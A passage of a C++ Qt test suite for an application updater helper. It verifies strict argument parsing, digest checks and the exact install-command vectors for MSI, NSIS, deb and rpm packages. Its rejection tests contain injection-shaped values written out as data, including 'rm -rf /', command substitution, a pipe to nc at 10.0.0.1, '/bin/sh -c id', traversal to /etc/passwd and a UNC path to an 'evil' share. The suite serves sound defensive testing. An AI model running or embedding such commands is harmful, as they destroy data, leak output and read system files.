// lightning-updater: argv contract and install-strategy planning.
//
// The helper accepts NO command strings. This suite proves that the argument
// vector is validated exactly as UPDATE-SPEC §11 requires — every option
// enumerated, every value checked, injection-shaped values refused on their
// own merits — and that every strategy produces a program path plus a
// QStringList argument VECTOR in which a hostile or merely awkward path stays
// one single element.

#include "updater/ArtifactDigest.h"
#include "updater/InstallStrategies.h"
#include "updater/UpdaterArgs.h"

#include <QCryptographicHash>
#include <QDir>
#include <QFile>
#include <QJsonDocument>
#include <QJsonObject>
#include <QProcess>
#include <QTemporaryDir>
#include <QtTest/QtTest>

using namespace updater;

namespace {

QString writeFile(const QString &path, const QByteArray &contents)
{
    QFile file(path);
    if (!file.open(QIODevice::WriteOnly))
        return QString();
    file.write(contents);
    file.close();
    return path;
}

} // namespace

class UpdaterHelperArgsTest : public QObject
{
    Q_OBJECT

private slots:
    void initTestCase();

    // --- mode identifiers ---
    void modeStringsRoundTrip();
    void unknownModeStringsAreInvalid();
    void selfInstallableSetIsExactlySix();

    // --- happy path ---
    void everySelfInstallableModeParses();
    void parsedPathsAreAbsoluteAndCanonical();

    // --- structural refusals ---
    void emptyArgumentsRefused();
    void unknownOptionRefused();
    void positionalArgumentRefused();
    void duplicateOptionRefused();
    void missingValueRefused();
    void missingRequiredOptionRefused();
    void valueThatLooksLikeAnOptionRefused();
    void relaunchIsOptionalAndAbsenceMeansNoRelaunch();
    void relaunchIsStillFullyValidatedWhenPresent();
    void everyOtherOptionStaysRequired_data();
    void everyOtherOptionStaysRequired();

    // --- value refusals ---
    void injectionShapedValuesAreRefused_data();
    void injectionShapedValuesAreRefused();
    void controlCharactersRefused_data();
    void controlCharactersRefused();
    void relativePathsRefused_data();
    void relativePathsRefused();
    void badPidRefused_data();
    void badPidRefused();

    // --- filesystem preconditions ---
    void missingArtifactRefused();
    void directoryArtifactRefused();
    void emptyArtifactRefused();
    void portableTargetMustBeADirectory();
    void appImageTargetMustBeAFile();
    void statusParentMustExist();
    void statusMustNotBeADirectory();
    void statusMustNotBeASymlink();
    void relaunchMustExist();
    void nonSelfInstallableModesRefused_data();
    void nonSelfInstallableModesRefused();

    // --- pre-scan used by main() for failure reporting ---
    void preScanFindsStatusPathOnlyWhenUnambiguous();

    // --- strategies ---
    void msiPlanIsExactArgv();
    void setupPlanUsesNsisSilentSwitchFirst();
    void inProcessModesRequireNoExternalProcess();
    void debPrefersAptGetThenDpkg();
    void debWithoutPkexecFails();
    void rpmProbeOrderIsDnf5DnfRpmOstreeRpm();
    void rpmWithNoFrontendFails();
    void noPlanEverCarriesAForceSwitch();
    void awkwardPathSurvivesAsASingleArgvElement();
    void planForModeRefusesEcosystemManagedTypes_data();
    void planForModeRefusesEcosystemManagedTypes();

    // --- the digest contract ---
    void digestMustBeSixtyFourLowercaseHex_data();
    void digestMustBeSixtyFourLowercaseHex();
    void artifactTargetAndRelaunchMustNotBeSymlinks();
    void fileDigestMatchesQCryptographicHash();
    // The REAL helper binary, end to end: a swapped artifact is refused
    // before anything is touched, and the same call with the right digest
    // installs.
    void theHelperRefusesAnArtifactWhoseDigestChanged();
    void theHelperInstallsWhenTheDigestMatches();

private:
    QStringList baseArgs(const QString &mode, const QString &target) const;
    UpdaterArguments parseOrFail(const QStringList &args);

    QTemporaryDir m_dir;
    QString m_artifact;
    QString m_targetFile;
    QString m_targetDir;
    QString m_relaunch;
    QString m_status;
};

void UpdaterHelperArgsTest::initTestCase()
{
    QVERIFY(m_dir.isValid());
    const QDir root(m_dir.path());

    m_artifact = writeFile(root.absoluteFilePath(QStringLiteral("Lightning.deb")),
                           QByteArray("payload"));
    QVERIFY(!m_artifact.isEmpty());

    m_targetFile = writeFile(root.absoluteFilePath(QStringLiteral("Lightning.AppImage")),
                             QByteArray("old"));
    QVERIFY(!m_targetFile.isEmpty());

    m_targetDir = root.absoluteFilePath(QStringLiteral("install"));
    QVERIFY(QDir().mkpath(m_targetDir));

    m_relaunch = writeFile(root.absoluteFilePath(QStringLiteral("lightning-bin")),
                           QByteArray("#!/bin/true\n"));
    QVERIFY(!m_relaunch.isEmpty());

    m_status = root.absoluteFilePath(QStringLiteral("status.json"));
}

QStringList UpdaterHelperArgsTest::baseArgs(const QString &mode,
                                            const QString &target) const
{
    return {QStringLiteral("--mode"),     mode,
            QStringLiteral("--artifact"), m_artifact,
            QStringLiteral("--pid"),      QStringLiteral("4242"),
            QStringLiteral("--target"),   target,
            QStringLiteral("--sha256"),   sha256HexOfFile(m_artifact),
            QStringLiteral("--relaunch"), m_relaunch,
            // Last on purpose: missingValueRefused() drops the final token.
            QStringLiteral("--status"),   m_status};
}

UpdaterArguments UpdaterHelperArgsTest::parseOrFail(const QStringList &args)
{
    const ArgsParseResult result = parseUpdaterArgs(args);
    if (!result.ok())
        qWarning() << "unexpected parse failure:" << parseErrorName(result.error)
                   << result.message;
    return result.args;
}

// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::modeStringsRoundTrip()
{
    const QStringList canonical = {
        QStringLiteral("windows-msi"),   QStringLiteral("windows-setup"),
        QStringLiteral("windows-portable"), QStringLiteral("linux-appimage"),
        QStringLiteral("linux-deb"),     QStringLiteral("linux-rpm"),
        QStringLiteral("linux-flatpak"), QStringLiteral("linux-snap"),
        QStringLiteral("macos-dmg"),     QStringLiteral("development"),
        QStringLiteral("unknown"),
    };
    for (const QString &name : canonical) {
        const UpdaterMode mode = modeFromString(name);
        QVERIFY2(mode != UpdaterMode::Invalid, qPrintable(name));
        QCOMPARE(modeToString(mode), name);
    }
}

void UpdaterHelperArgsTest::unknownModeStringsAreInvalid()
{
    // No case folding, no trimming, no aliasing. An identifier is exact or it
    // is not an identifier.
    const QStringList rejected = {
        QStringLiteral("LINUX-DEB"),  QStringLiteral("Linux-Deb"),
        QStringLiteral("linux_deb"),  QStringLiteral(" linux-deb"),
        QStringLiteral("linux-deb "), QStringLiteral("linux-deb\n"),
        QStringLiteral("deb"),        QStringLiteral(""),
        QStringLiteral("linux-deb; rm -rf /"),
    };
    for (const QString &name : rejected)
        QCOMPARE(modeFromString(name), UpdaterMode::Invalid);
}

void UpdaterHelperArgsTest::selfInstallableSetIsExactlySix()
{
    int count = 0;
    const QList<UpdaterMode> all = {
        UpdaterMode::WindowsMsi,      UpdaterMode::WindowsSetup,
        UpdaterMode::WindowsPortable, UpdaterMode::LinuxAppImage,
        UpdaterMode::LinuxDeb,        UpdaterMode::LinuxRpm,
        UpdaterMode::LinuxFlatpak,    UpdaterMode::LinuxSnap,
        UpdaterMode::MacosDmg,        UpdaterMode::Development,
        UpdaterMode::UnknownInstall,  UpdaterMode::Invalid,
    };
    for (UpdaterMode mode : all) {
        if (isSelfInstallable(mode))
            ++count;
    }
    QCOMPARE(count, 6);
    QVERIFY(!isSelfInstallable(UpdaterMode::LinuxFlatpak));
    QVERIFY(!isSelfInstallable(UpdaterMode::LinuxSnap));
    QVERIFY(!isSelfInstallable(UpdaterMode::Development));
    QVERIFY(!isSelfInstallable(UpdaterMode::UnknownInstall));
}

void UpdaterHelperArgsTest::everySelfInstallableModeParses()
{
    struct Case { const char *mode; QString target; };
    const QList<Case> cases = {
        {"windows-msi", m_targetDir},
        {"windows-setup", m_targetDir},
        {"windows-portable", m_targetDir},
        {"linux-appimage", m_targetFile},
        {"linux-deb", m_targetDir},
        {"linux-rpm", m_targetDir},
    };
    for (const Case &c : cases) {
        const ArgsParseResult parsed =
            parseUpdaterArgs(baseArgs(QString::fromLatin1(c.mode), c.target));
        QVERIFY2(parsed.ok(), c.mode);
        QCOMPARE(parsed.args.modeString, QString::fromLatin1(c.mode));
        QCOMPARE(parsed.args.pid, qint64(4242));
    }
}

void UpdaterHelperArgsTest::parsedPathsAreAbsoluteAndCanonical()
{
    const UpdaterArguments args =
        parseOrFail(baseArgs(QStringLiteral("linux-deb"), m_targetDir));
    QVERIFY(QFileInfo(args.artifactPath).isAbsolute());
    QVERIFY(QFileInfo(args.targetPath).isAbsolute());
    QVERIFY(QFileInfo(args.relaunchPath).isAbsolute());
    QVERIFY(QFileInfo(args.statusPath).isAbsolute());
}

// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::emptyArgumentsRefused()
{
    const ArgsParseResult parsed = parseUpdaterArgs(QStringList());
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::EmptyArguments);
}

void UpdaterHelperArgsTest::unknownOptionRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args << QStringLiteral("--exec") << QStringLiteral("/bin/sh");
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::UnknownOption);
    QCOMPARE(parsed.offendingOption, QStringLiteral("--exec"));
}

void UpdaterHelperArgsTest::positionalArgumentRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args << QStringLiteral("/bin/sh");
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PositionalArgument);
}

void UpdaterHelperArgsTest::duplicateOptionRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args << QStringLiteral("--mode") << QStringLiteral("linux-rpm");
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::DuplicateOption);
    QCOMPARE(parsed.offendingOption, QStringLiteral("--mode"));
}

void UpdaterHelperArgsTest::missingValueRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args.removeLast(); // drop the --status value
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::MissingValue);
    QCOMPARE(parsed.offendingOption, QStringLiteral("--status"));
}

void UpdaterHelperArgsTest::missingRequiredOptionRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    args.removeLast();
    args.removeLast(); // drop --status entirely
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::MissingRequiredOption);
    QCOMPARE(parsed.offendingOption, QStringLiteral("--status"));
}

void UpdaterHelperArgsTest::valueThatLooksLikeAnOptionRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--artifact"));
    args[index + 1] = QStringLiteral("--pid");
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::MissingValue);
}

void UpdaterHelperArgsTest::relaunchIsOptionalAndAbsenceMeansNoRelaunch()
{
    // Lightning omits --relaunch for a plain installUpdate(): the update is
    // applied when the user quits, and the helper must NOT start the
    // application back up. Before this, the helper always relaunched.
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--relaunch"));
    QVERIFY(index >= 0);
    args.removeAt(index + 1);
    args.removeAt(index);
    QVERIFY(!args.contains(QStringLiteral("--relaunch")));

    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY2(parsed.ok(), qPrintable(parseErrorName(parsed.error)));
    QVERIFY(parsed.args.relaunchPath.isEmpty());
    QVERIFY(!parsed.args.relaunchRequested());
    // Everything else is unaffected.
    QCOMPARE(parsed.args.modeString, QStringLiteral("linux-deb"));
    QCOMPARE(parsed.args.pid, qint64(4242));
    QCOMPARE(parsed.args.statusPath, m_status);

    // ...and supplying it flips exactly that one thing.
    const ArgsParseResult withRelaunch =
        parseUpdaterArgs(baseArgs(QStringLiteral("linux-deb"), m_targetDir));
    QVERIFY(withRelaunch.ok());
    QVERIFY(withRelaunch.args.relaunchRequested());
    QCOMPARE(withRelaunch.args.relaunchPath, m_relaunch);
}

void UpdaterHelperArgsTest::relaunchIsStillFullyValidatedWhenPresent()
{
    // Optional must not mean lenient: every refusal that applied before still
    // applies when the option IS supplied.
    struct Case { const char *name; QString value; ArgsError error; };
    const QList<Case> cases = {
        {"relative", QStringLiteral("lightning-bin"), ArgsError::PathNotAbsolute},
        {"missing", QDir(m_dir.path()).absoluteFilePath(QStringLiteral("gone")),
         ArgsError::PathDoesNotExist},
        {"directory", m_targetDir, ArgsError::PathNotAFile},
        {"traversal", QDir(m_dir.path()).absoluteFilePath(QStringLiteral("../x")),
         ArgsError::PathTraversal},
        {"control-character", m_relaunch + QStringLiteral("\nrm"), ArgsError::UnsafeValue},
    };
    for (const Case &c : cases) {
        QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
        args[args.indexOf(QStringLiteral("--relaunch")) + 1] = c.value;
        const ArgsParseResult parsed = parseUpdaterArgs(args);
        QVERIFY2(!parsed.ok(), c.name);
        QVERIFY2(parsed.error == c.error, c.name);
    }

    // A duplicate is still a duplicate, optional or not.
    QStringList twice = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    twice << QStringLiteral("--relaunch") << m_relaunch;
    QCOMPARE(parseUpdaterArgs(twice).error, ArgsError::DuplicateOption);
}

void UpdaterHelperArgsTest::everyOtherOptionStaysRequired_data()
{
    QTest::addColumn<QString>("option");
    QTest::newRow("mode") << "--mode";
    QTest::newRow("artifact") << "--artifact";
    QTest::newRow("pid") << "--pid";
    QTest::newRow("target") << "--target";
    QTest::newRow("status") << "--status";
    QTest::newRow("sha256") << "--sha256";
}

void UpdaterHelperArgsTest::everyOtherOptionStaysRequired()
{
    QFETCH(QString, option);
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(option);
    QVERIFY(index >= 0);
    args.removeAt(index + 1);
    args.removeAt(index);
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY2(!parsed.ok(), qPrintable(option));
    QCOMPARE(parsed.error, ArgsError::MissingRequiredOption);
    QCOMPARE(parsed.offendingOption, option);
}

// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::injectionShapedValuesAreRefused_data()
{
    QTest::addColumn<QString>("option");
    QTest::addColumn<QString>("value");

    // None of these are treated as anything but a literal path; they are
    // refused because they are not absolute, or because no such file exists —
    // never because a quoting rule saved us.
    QTest::newRow("semicolon-rm") << "--artifact" << "/tmp/x; rm -rf /";
    QTest::newRow("command-substitution") << "--artifact" << "/tmp/$(whoami)";
    QTest::newRow("backticks") << "--artifact" << "/tmp/`id`";
    QTest::newRow("ampersand-chain") << "--relaunch" << "/tmp/x && calc.exe";
    QTest::newRow("pipe") << "--relaunch" << "/tmp/x | nc 10.0.0.1 1";
    QTest::newRow("sh-c") << "--relaunch" << "/bin/sh -c id";
    QTest::newRow("redirect") << "--status" << "/tmp/../../etc/passwd";
    QTest::newRow("relative-traversal") << "--artifact" << "../../etc/passwd";
    QTest::newRow("env-expansion") << "--target" << "$HOME/Lightning";
    QTest::newRow("windows-unc") << "--target" << "\\\\evil\\share\\x";
}

void UpdaterHelperArgsTest::injectionShapedValuesAreRefused()
{
    QFETCH(QString, option);
    QFETCH(QString, value);

    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(option);
    QVERIFY(index >= 0);
    args[index + 1] = value;

    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY2(!parsed.ok(), qPrintable(value));
}

void UpdaterHelperArgsTest::controlCharactersRefused_data()
{
    QTest::addColumn<QString>("value");
    QTest::newRow("nul") << QString(QChar(0)) + m_artifact;
    QTest::newRow("newline") << m_artifact + QStringLiteral("\ninjected");
    QTest::newRow("carriage-return") << m_artifact + QStringLiteral("\rinjected");
    QTest::newRow("tab") << m_artifact + QStringLiteral("\tinjected");
    QTest::newRow("bell") << m_artifact + QString(QChar(7));
    QTest::newRow("delete") << m_artifact + QString(QChar(0x7F));
    QTest::newRow("over-long") << QStringLiteral("/") + QString(5000, QLatin1Char('a'));
}

void UpdaterHelperArgsTest::controlCharactersRefused()
{
    QFETCH(QString, value);
    QVERIFY(valueIsUnsafe(value));

    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--artifact"));
    args[index + 1] = value;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::UnsafeValue);
}

void UpdaterHelperArgsTest::relativePathsRefused_data()
{
    QTest::addColumn<QString>("option");
    QTest::addColumn<QString>("value");
    QTest::newRow("artifact") << "--artifact" << "Lightning.deb";
    QTest::newRow("artifact-dot") << "--artifact" << "./Lightning.deb";
    QTest::newRow("target") << "--target" << "install";
    QTest::newRow("relaunch") << "--relaunch" << "lightning-bin";
    QTest::newRow("status") << "--status" << "status.json";
}

void UpdaterHelperArgsTest::relativePathsRefused()
{
    QFETCH(QString, option);
    QFETCH(QString, value);
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(option);
    args[index + 1] = value;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathNotAbsolute);
}

void UpdaterHelperArgsTest::badPidRefused_data()
{
    QTest::addColumn<QString>("value");
    QTest::newRow("zero") << "0";
    QTest::newRow("one") << "1";
    QTest::newRow("negative") << "-5";
    QTest::newRow("plus") << "+7";
    QTest::newRow("alpha") << "abc";
    QTest::newRow("trailing-alpha") << "12abc";
    QTest::newRow("leading-space") << " 12";
    QTest::newRow("hex") << "0x10";
    QTest::newRow("exponent") << "1e3";
    QTest::newRow("overflow") << "99999999999999999999999";
    QTest::newRow("dot") << "12.0";
}

void UpdaterHelperArgsTest::badPidRefused()
{
    QFETCH(QString, value);
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--pid"));
    args[index + 1] = value;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY2(!parsed.ok(), qPrintable(value));
}

// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::missingArtifactRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--artifact"));
    args[index + 1] = QDir(m_dir.path()).absoluteFilePath(QStringLiteral("nope.deb"));
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathDoesNotExist);
}

void UpdaterHelperArgsTest::directoryArtifactRefused()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--artifact"));
    args[index + 1] = m_targetDir;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathNotAFile);
}

void UpdaterHelperArgsTest::emptyArtifactRefused()
{
    const QString empty =
        writeFile(QDir(m_dir.path()).absoluteFilePath(QStringLiteral("empty.deb")),
                  QByteArray());
    QVERIFY(!empty.isEmpty());
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--artifact"));
    args[index + 1] = empty;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::ArtifactEmpty);
}

void UpdaterHelperArgsTest::portableTargetMustBeADirectory()
{
    const ArgsParseResult parsed =
        parseUpdaterArgs(baseArgs(QStringLiteral("windows-portable"), m_targetFile));
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathNotADirectory);
}

void UpdaterHelperArgsTest::appImageTargetMustBeAFile()
{
    const ArgsParseResult parsed =
        parseUpdaterArgs(baseArgs(QStringLiteral("linux-appimage"), m_targetDir));
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathNotAFile);
}

void UpdaterHelperArgsTest::statusParentMustExist()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--status"));
    args[index + 1] =
        QDir(m_dir.path()).absoluteFilePath(QStringLiteral("no/such/dir/status.json"));
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::StatusParentMissing);
}

void UpdaterHelperArgsTest::statusMustNotBeADirectory()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--status"));
    args[index + 1] = m_targetDir;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathNotAFile);
}

void UpdaterHelperArgsTest::statusMustNotBeASymlink()
{
#ifdef Q_OS_WIN
    QSKIP("symlink creation requires elevation on Windows");
#else
    const QString link =
        QDir(m_dir.path()).absoluteFilePath(QStringLiteral("status-link.json"));
    QFile::remove(link);
    QVERIFY(QFile::link(m_relaunch, link));

    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--status"));
    args[index + 1] = link;
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathIsSymlink);
    QFile::remove(link);
#endif
}

void UpdaterHelperArgsTest::relaunchMustExist()
{
    QStringList args = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    const int index = args.indexOf(QStringLiteral("--relaunch"));
    args[index + 1] = QDir(m_dir.path()).absoluteFilePath(QStringLiteral("gone"));
    const ArgsParseResult parsed = parseUpdaterArgs(args);
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::PathDoesNotExist);
}

void UpdaterHelperArgsTest::nonSelfInstallableModesRefused_data()
{
    QTest::addColumn<QString>("mode");
    QTest::newRow("flatpak") << "linux-flatpak";
    QTest::newRow("snap") << "linux-snap";
    QTest::newRow("dmg") << "macos-dmg";
    QTest::newRow("development") << "development";
    QTest::newRow("unknown") << "unknown";
}

void UpdaterHelperArgsTest::nonSelfInstallableModesRefused()
{
    QFETCH(QString, mode);
    const ArgsParseResult parsed = parseUpdaterArgs(baseArgs(mode, m_targetDir));
    QVERIFY(!parsed.ok());
    QCOMPARE(parsed.error, ArgsError::ModeNotSelfInstallable);
}

void UpdaterHelperArgsTest::preScanFindsStatusPathOnlyWhenUnambiguous()
{
    const QStringList good = baseArgs(QStringLiteral("linux-deb"), m_targetDir);
    QCOMPARE(preScanStatusPath(good), m_status);

    QStringList twice = good;
    twice << QStringLiteral("--status") << m_status;
    QVERIFY(preScanStatusPath(twice).isEmpty());

    QStringList relative = good;
    relative[relative.indexOf(QStringLiteral("--status")) + 1] =
        QStringLiteral("status.json");
    QVERIFY(preScanStatusPath(relative).isEmpty());

    QVERIFY(preScanStatusPath(QStringList()).isEmpty());
}

// ---------------------------------------------------------------------------
// Strategies
// ---------------------------------------------------------------------------

void UpdaterHelperArgsTest::msiPlanIsExactArgv()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::WindowsMsi;
    args.artifactPath =
        QStringLiteral("C:/Users/x/AppData/Local/updates/Lightning-0.8.0.msi");

    const StrategyResult result = planWindowsMsi(args);
    QVERIFY(result.ok());
    QVERIFY(result.plan.requiresExternalProcess);
    QVERIFY(result.plan.program.endsWith(QStringLiteral("msiexec.exe")));
    QCOMPARE(result.plan.arguments.size(), 4);
    QCOMPARE(result.plan.arguments.at(0), QStringLiteral("/i"));
    // The package path must reach msiexec with BACKSLASHES. Qt produces '/'
    // on Windows too, and msiexec's own parser reads '/' as a switch: the
    // forward-slash form returns 1619 and installs nothing, which is what
    // every MSI update did in the field until 2026-08-17. Verified by hand
    // against one file — '/' errored, '\' installed normally.
    QCOMPARE(result.plan.arguments.at(1),
             QStringLiteral("C:\\Users\\x\\AppData\\Local\\updates\\Lightning-0.8.0.msi"));
    QVERIFY(!result.plan.arguments.at(1).contains(QLatin1Char('/')));
    QCOMPARE(result.plan.arguments.at(2), QStringLiteral("/qb"));
    QCOMPARE(result.plan.arguments.at(3), QStringLiteral("REINSTALLMODE=vomus"));
    // The MSI is per-user; the helper must never try to elevate for it.
    QVERIFY(!result.plan.elevates);
}

void UpdaterHelperArgsTest::setupPlanUsesNsisSilentSwitchFirst()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::WindowsSetup;
    // A POSIX-rooted path: QFileInfo::absolutePath() is evaluated on the
    // HOST, and a "C:/..." string is relative on Linux, which would make the
    // working-directory expectation depend on the test's own cwd.
    args.artifactPath =
        QStringLiteral("/staging/Lightning-0.8.0-abc1234-windows-x86_64-setup.exe");

    const StrategyResult result = planWindowsSetup(args);
    QVERIFY(result.ok());
    QVERIFY(result.plan.requiresExternalProcess);
    // The verified artifact IS the program; it is never passed to a shell.
    // Native separators here are precautionary rather than observed-broken:
    // CreateProcess accepts '/', unlike msiexec's own parser.
    QCOMPARE(result.plan.program,
             QStringLiteral("\\staging\\Lightning-0.8.0-abc1234-windows-x86_64-setup.exe"));
    QCOMPARE(result.plan.workingDirectory, QStringLiteral("\\staging"));
    QVERIFY(!result.plan.program.contains(QLatin1Char('/')));
    QCOMPARE(result.plan.arguments, kNsisSilentSwitches);
    // NSIS parses its switches positionally: /S must be first.
    QCOMPARE(result.plan.arguments.first(), QStringLiteral("/S"));
    // Per-user installer: no elevation.
    QVERIFY(!result.plan.elevates);
    // We deliberately do not force an install directory.
    for (const QString &argument : result.plan.arguments)
        QVERIFY(!argument.startsWith(QStringLiteral("/D")));
}

void UpdaterHelperArgsTest::inProcessModesRequireNoExternalProcess()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::WindowsPortable;
    StrategyResult portable = planWindowsPortable(args);
    QVERIFY(portable.ok());
    QVERIFY(!portable.plan.requiresExternalProcess);
    QVERIFY(portable.plan.program.isEmpty());
    QVERIFY(portable.plan.arguments.isEmpty());

    args.mode = UpdaterMode::LinuxAppImage;
    StrategyResult appImage = planLinuxAppImage(args);
    QVERIFY(appImage.ok());
    QVERIFY(!appImage.plan.requiresExternalProcess);
    QVERIFY(appImage.plan.program.isEmpty());
}

void UpdaterHelperArgsTest::debPrefersAptGetThenDpkg()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::LinuxDeb;
    args.artifactPath = QStringLiteral("/staging/lightning_0.8.0_amd64.deb");

    const auto everything = [](const QString &) { return true; };
    StrategyResult withApt = planLinuxDeb(args, everything);
    QVERIFY(withApt.ok());
    QVERIFY(withApt.plan.elevates);
    QCOMPARE(withApt.plan.program, QStringLiteral("/usr/bin/pkexec"));
    QCOMPARE(withApt.plan.arguments,
             QStringList({QStringLiteral("/usr/bin/apt-get"),
                          QStringLiteral("install"), QStringLiteral("-y"),
                          QStringLiteral("--only-upgrade"), args.artifactPath}));

    const auto noApt = [](const QString &path) {
        return path != QStringLiteral("/usr/bin/apt-get");
    };
    StrategyResult withDpkg = planLinuxDeb(args, noApt);
    QVERIFY(withDpkg.ok());
    QCOMPARE(withDpkg.plan.arguments,
             QStringList({QStringLiteral("/usr/bin/dpkg"), QStringLiteral("-i"),
                          args.artifactPath}));
}

void UpdaterHelperArgsTest::debWithoutPkexecFails()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::LinuxDeb;
    args.artifactPath = QStringLiteral("/staging/lightning.deb");

    const auto noPkexec = [](const QString &path) {
        return !path.endsWith(QStringLiteral("pkexec"));
    };
    const StrategyResult result = planLinuxDeb(args, noPkexec);
    QVERIFY(!result.ok());
    QCOMPARE(result.error, StrategyError::ElevationHelperMissing);
    QVERIFY(result.plan.program.isEmpty());
}

void UpdaterHelperArgsTest::rpmProbeOrderIsDnf5DnfRpmOstreeRpm()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::LinuxRpm;
    args.artifactPath = QStringLiteral("/staging/lightning-0.8.0-1.x86_64.rpm");

    QStringList absent;
    const auto probe = [&absent](const QString &path) {
        return !absent.contains(path);
    };

    StrategyResult result = planLinuxRpm(args, probe);
    QVERIFY(result.ok());
    QCOMPARE(result.plan.arguments.first(), QStringLiteral("/usr/bin/dnf5"));
    QCOMPARE(result.plan.arguments,
             QStringList({QStringLiteral("/usr/bin/dnf5"), QStringLiteral("install"),
                          QStringLiteral("-y"), args.artifactPath}));

    absent << QStringLiteral("/usr/bin/dnf5");
    result = planLinuxRpm(args, probe);
    QVERIFY(result.ok());
    QCOMPARE(result.plan.arguments.first(), QStringLiteral("/usr/bin/dnf"));

    absent << QStringLiteral("/usr/bin/dnf");
    result = planLinuxRpm(args, probe);
    QVERIFY(result.ok());
    QCOMPARE(result.plan.arguments,
             QStringList({QStringLiteral("/usr/bin/rpm-ostree"),
                          QStringLiteral("install"), args.artifactPath}));

    absent << QStringLiteral("/usr/bin/rpm-ostree");
    result = planLinuxRpm(args, probe);
    QVERIFY(result.ok());
    QCOMPARE(result.plan.arguments,
             QStringList({QStringLiteral("/usr/bin/rpm"), QStringLiteral("-U"),
                          args.artifactPath}));
}

void UpdaterHelperArgsTest::rpmWithNoFrontendFails()
{
    UpdaterArguments args;
    args.mode = UpdaterMode::LinuxRpm;
    args.artifactPath = QStringLiteral("/staging/lightning.rpm");

    const auto onlyPkexec = [](const QString &path) {
        return path.endsWith(QStringLiteral("pkexec"));
    };
    const StrategyResult result = planLinuxRpm(args, onlyPkexec);
    QVERIFY(!result.ok());
    QCOMPARE(result.error, StrategyError::NoPackageManagerFound);
}

void UpdaterHelperArgsTest::noPlanEverCarriesAForceSwitch()
{
    UpdaterArguments args;
    args.artifactPath = QStringLiteral("/staging/lightning.pkg");
    const auto everything = [](const QString &) { return true; };

    const QList<StrategyResult> plans = {
        planWindowsMsi(args),
